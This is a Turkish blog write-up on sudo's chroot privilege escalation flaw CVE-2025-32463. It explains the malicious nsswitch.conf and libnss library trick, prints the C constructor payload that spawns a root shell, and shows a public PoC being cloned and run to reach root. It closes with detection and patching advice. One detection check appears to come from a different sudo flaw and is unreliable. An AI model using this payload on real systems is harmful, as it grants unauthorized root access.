---
title: "CVE: Sudo Chroot CVE-2025-32463"
author: BilalGns
categories: [Hacking - Security]
tags: [cve, cve 2025-32463, privilege escalation, chroot, PoC, linux, sudo, zero-day, exploit]
render_with_liquid: false
layout: post
published: true  
---


Bu yazımda, kısa bir süre önce yayınlanan ve sudo'nun chroot (chwoot) fonksiyonunu etkileyen kritik bir yerel yetki yükseltme zafiyeti olan `CVE-2025-32463`'ü inceleyeceğiz. Bu açık, sistemde sudo kuralı tanımlı olmayan sıradan kullanıcıların bile root yetkileri elde etmesine olanak tanımaktadır.

<br>

## **Nasıl Çalışıyor?**

Zafiyet, sudo’nun `-R` veya `--chroot` parametresinin kullanımı sırasında, belirtilen kök dizine (**chroot** dizini) geçilerek komut eşleştirme işleminin bu ortamda yapılmasından kaynaklanmaktadır. Bu süreçte, saldırgan chroot dizinine sahte bir `/etc/nsswitch.conf` yerleştirerek, sudo’nun kötü niyetli bir **shared object** dosyasını (**libnss_*.so**) yüklemesini sağlayabilir.

Bu dosya sayesinde, sistemde root haklarıyla bir shell başlatılabilir.

<br>

### **Etkilenen Versiyonlar**

- Sudo **1.9.14 – 1.9.17**

<blockquote class="prompt-danger"><p>Etkilenmeyen sürümler: <b>Sudo <= 1.8.32</b> (çünkü <b>chroot</b> desteği bu sürümlerde yoktur)
</p></blockquote>

<blockquote class="prompt-info"><p>Versiyon kontorolü için şu komutu kullanabilirsiniz:

   <b>sudo -V | grep "Sudo version"</b>

</p></blockquote>

<br>

### **Zafiyetin Etkisi**

Sudo konfigürasyonunda hiçbir izin tanımlanmamış olsa bile, sistemde yüklü olan savunmasız sudo sürümü ile yerel bir kullanıcı **root** erişimi elde edebilir.

Bu durum, sistemin bütünlüğü, gizliliği ve erişilebilirliği üzerinde ciddi tehditler oluşturur.



<br>

### **Detaylı Teknik Açıklama**

Zafiyetin kökeni, sudo'nun `chroot()` çağrısını sudoers kuralı eşleştirilmeden önce yapmasıdır. Bu sayede:

- **pivot_root()** ve **unpivot_root()** ile sistem geçici olarak **chroot** ortamına alınır,

- Bu ortamda `/etc/nsswitch.conf` içindeki servis girdileri işlenir (örn: **passwd: /woot1337**),

- Bu girdiler, **libnss_woot1337.so.2** gibi saldırgan tarafından hazırlanan **.so** dosyalarının yüklenmesine sebep olur.

Bu shared object dosyası, **constructor** niteliğinde bir `woot()` fonksiyonu içerir:

```c
__attribute__((constructor)) void woot(void) {
  setreuid(0,0);
  setregid(0,0);
  execl("/bin/bash", "/bin/bash", NULL);
}
```

Bu fonksiyon çalıştığında, shell doğrudan root olarak başlatılır.


<br>

## **Nasıl Sömürülür?**

İlk olarak sömürü repomuzu aşağıdaki gibi sisteme klonluyoruz:

```console
┌──(kali㉿kali)-[~]
└─$ git clone https://github.com/pr0v3rbs/CVE-2025-32463_chwoot.git           
Cloning into 'CVE-2025-32463_chwoot'...
remote: Enumerating objects: 9, done.
remote: Counting objects: 100% (9/9), done.
remote: Compressing objects: 100% (7/7), done.
remote: Total 9 (delta 2), reused 9 (delta 2), pack-reused 0 (from 0)
Receiving objects: 100% (9/9), done.
Resolving deltas: 100% (2/2), done.
```

Daha sonra `CVE-2025-32463_chwoot` dizinine geçiyoruz:

```console
┌──(kali㉿kali)-[~]
└─$ cd CVE-2025-32463_chwoot 
```

Şimdi de son olarak exploiti çalıştırıyoruz:

```console
┌──(kali㉿kali)-[~/CVE-2025-32463_chwoot]
└─$ ./sudo-chwoot.sh 
woot!
┌──(root㉿kali)-[/]
└─# id
uid=0(root) gid=0(root) groups=0(root),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),107(bluetooth),115(scanner),126(lpadmin),134(wireshark),136(kaboxer),1000(kali)
```

<br>

## **Tespit**
- Sistem loglarında `CHROOT=` içeren sudo komutlarını kontrol edin.

- `/etc/sudoers` ve `/etc/sudoers.d/` dizinlerinde `CHROOT=` veya `runchroot=` içeren satırları arayın.

- `ldapsearch` gibi araçlarla LDAP üzerinden tanımlanmış sudo kurallarını da gözden geçirin.

- Sistemlerdeki Sudoers konfigürasyon dosyası aşağıdaki komutla kontrol edilmelidir. Eğer Aşağıdaki  komut bir çıktı `üretiyorsa` zafiyet var demektir.

```console
“grep 'ALL.*!root' /etc/sudoers /etc/sudoers.d/*”
“bob myhost = (ALL, !root) /usr/bin/vi”
```

<br>

## **Önlem ve Güncelleme**

- Sudo’yu `1.9.17p1` veya daha yeni bir sürüme güncelleyin.

- Bu güncelleme, sudoers eşleştirme sırasında `chroot()` çağrısını devre dışı bırakır.

- Gelişmiş sistemlerde AppArmor/SELinux gibi kontrol mekanizmalarıyla sudo komutlarını izole edin.


<br>

## Referanslar

- <a href="https://nvd.nist.gov/vuln/detail/CVE-2025-32463" target="_blank" rel="noopener noreferrer">https://nvd.nist.gov/vuln/detail/CVE-2025-32463</a>
- <a href="https://www.sudo.ws/security/advisories/" target="_blank" rel="noopener noreferrer">https://www.sudo.ws/security/advisories/</a>
- <a href="https://www.stratascale.com/vulnerability-alert-CVE-2025-32463-sudo-chroot" target="_blank" rel="noopener noreferrer">https://www.stratascale.com/vulnerability-alert-CVE-2025-32463-sudo-chroot</a>
- <a href="https://github.com/pr0v3rbs/CVE-2025-32463_chwoot" target="_blank" rel="noopener noreferrer">https://github.com/pr0v3rbs/CVE-2025-32463_chwoot</a>


<br>

<p style="font-weight:900; color: gray; font-size: 50px; text-align:center;">Okuduğunuz için teşekkür ederim. thnx: by BilalGns<p>

<style>
.center img {
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}

.post-desc {
  font-family: 'Open Sans', sans-serif !important;
}
</style>
